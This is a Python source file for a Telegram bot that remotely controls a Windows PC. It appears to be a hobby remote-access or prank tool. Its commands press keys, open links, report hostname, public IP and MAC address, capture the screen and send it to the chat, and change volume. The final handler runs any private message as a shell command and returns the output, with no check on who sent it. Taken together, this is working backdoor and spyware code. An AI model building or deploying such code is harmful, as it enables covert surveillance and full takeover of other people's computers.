import subprocess
from pyrogram import Client, filters
import pyautogui
import io
import sys
import platform,socket,re,uuid,json,psutil,logging
from win10toast import ToastNotifier
from pyrogram import Client, filters
from PIL import ImageGrab
import webbrowser
from pyrogram.types import Message, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import random
import os
from pyrogram import *
import requests
app = Client("my_idiot")
toaster = ToastNotifier()
@ app.on_message(filters.command("press"))
def press_key(client, message):
    keys = message.text.split()[1:]
    pyautogui.hotkey(*keys)
# eg /press q u a x  a l e r t
@app.on_message(filters.command(['rickroll']))
def press_key(client, message):
    browser = webbrowser.get()
    browser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]

@app.on_message(filters.command(['pcinfo']))
def getSystemInfo(client, message):
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=get_ip()
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        json_str = json.dumps(info, separators=(',', ':'))

        # Remove brackets and double quotes
        result = json_str.replace('{', '').replace('}', '').replace('"', '')

        # Add newline character after each key-value pair
        result = result.replace(',', '\n')
        message.reply_text(result)

@app.on_message(filters.command(['web']))
async def open_link(_, message):
    try:
        # Get the link from the command argument
        link = message.text.split(' ')[1]

        # Check if the link starts with 'http://' or 'https://'
        if not link.startswith('http://') and not link.startswith('https://'):
            # If not, add 'https://' to the beginning of the link
            link = 'https://' + link

        # Get the user's default web browser
        browser = webbrowser.get()

        # Open the link in the user's default web browser
        browser.open(link)

        # Send a confirmation message to the user
        await message.reply_text(f"Opened {link} in your default web browser!")

    except IndexError:
        # If the user didn't provide a link in the command argument
        await message.reply_text("Please provide a link to open!")
@ app.on_message(filters.command("alert"))
def show_alert(client, message):

    text = " ".join(message.command[1:])
    sender_name = message.from_user.first_name
    toaster.show_toast(sender_name, text, duration=10)

async def get_media_messages(client, channel_username):
    messages = []
    async for message in client.iter_messages(channel_username, limit=1000):
        if message.media:
            messages.append(message)
    return messages

@ app.on_message(filters.command("close"))
def close_program(client, message):
    message.reply_text("Closing the program...")

    # Terminate the script using sys.exit
    sys.exit()
@app.on_message(filters.command("screenshot"))
def take_screenshot(client, message):
    # Take a screenshot of the entire screen
    screenshot = ImageGrab.grab()

    # Convert the screenshot to bytes
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)

    # Send the screenshot to the user who invoked the command
    client.send_photo(
        chat_id=message.chat.id,
        photo=buffer,
        caption="тест"
    )


# Handler function for the media command
@app.on_message(filters.command("media"))
def media_command_handler(client, message):
    # Define the inline keyboard markup with the volume control buttons
    volume_control_markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔊 -10", callback_data="decrease_volume_10"),
            InlineKeyboardButton("🔇", callback_data="mute_volume"),
            InlineKeyboardButton("🔉", callback_data="unmute_volume"),
            InlineKeyboardButton("🔊 +10", callback_data="increase_volume_10")
        ]
    ])

    # Send the volume control buttons with a message
    client.send_message(
        message.chat.id,
        "Select a volume control option:",
        reply_markup=volume_control_markup
    )


# Handler functions for the volume control buttons
# Handler functions for the volume control buttons
@app.on_callback_query(filters.create(lambda _, __, query: query.data == "decrease_volume_10"))
def decrease_volume_callback_handler(client, callback_query):
    # Decrease the volume by 10 using the nircmd utility
    os.system("nircmd.exe changesysvolume -6553")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume decreased by 10.")




@app.on_callback_query(filters.create(lambda _, __, query: query.data == "mute_volume"))
def mute_volume_callback_handler(client, callback_query):
    # Mute the volume using the nircmd utility
    os.system("nircmd.exe mutesysvolume 1")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume muted.")

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "unmute_volume"))
def mute_volume_callback_handler(client, callback_query):
    # Mute the volume using the nircmd utility
    os.system("nircmd.exe mutesysvolume 0")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume unmuted.")


@app.on_callback_query(filters.create(lambda _, __, query: query.data == "increase_volume_10"))
def increase_volume_callback_handler(client, callback_query):
    # Increase the volume by 10 using the nircmd utility
    os.system("nircmd.exe changesysvolume 6553")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume increased by 10.")


@app.on_message(filters.command("volume"))
def volume_command_handler(client, message):
    # Parse the volume level from the command arguments
    try:
        volume_level = int(message.command[1])
    except (IndexError, ValueError):
        client.send_message(message.chat.id, "Please specify a valid volume level.")
        return
    nircmd_volume = int(volume_level * 655.35)
    # Set the system volume using the Windows command line
    subprocess.run(["nircmd.exe", "setsysvolume", str(nircmd_volume)])

    # Send a confirmation message
    client.send_message(message.chat.id, f"Volume set to {volume_level}%")
@ app.on_message(filters.private)
def run_command(client, message):
    command = message.text
    try:
        msg = client.send_message(message.chat.id, "Running command...")
        output = subprocess.check_output(command, shell=True)
        if len(output) > 4096:
            output = output[:4093] + b""
        if "shutdown" in command:
            print(msg)
            client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text="Чмо блять")
        else:
            print(msg)
            client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=f"probably success \n {output.decode('cp866')}")
    except subprocess.CalledProcessError as e:
        print(msg)
        client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=f"Command failed with error:\n{e}")

app.run()
